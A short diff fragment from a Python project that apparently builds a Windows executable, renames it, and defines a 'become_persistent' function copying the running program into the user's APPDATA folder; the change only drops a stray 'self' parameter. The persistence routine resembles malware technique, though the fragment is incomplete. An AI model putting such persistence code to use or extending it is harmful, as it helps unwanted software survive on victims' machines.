@@ -57,7 +57,7 @@ folder_removal(f'{current_dir}/dist')
 os.rename(os.path.join(current_dir, 'main.exe'), os.path.join(current_dir, program_name)) # renames the program
 
 
-def become_persistent(self):
+def become_persistent():
     file_location = os.environ["appdata"] + f"\\{program_name}"
     if not os.path.exists(file_location):
         shutil.copyfile(sys.executable, file_location)
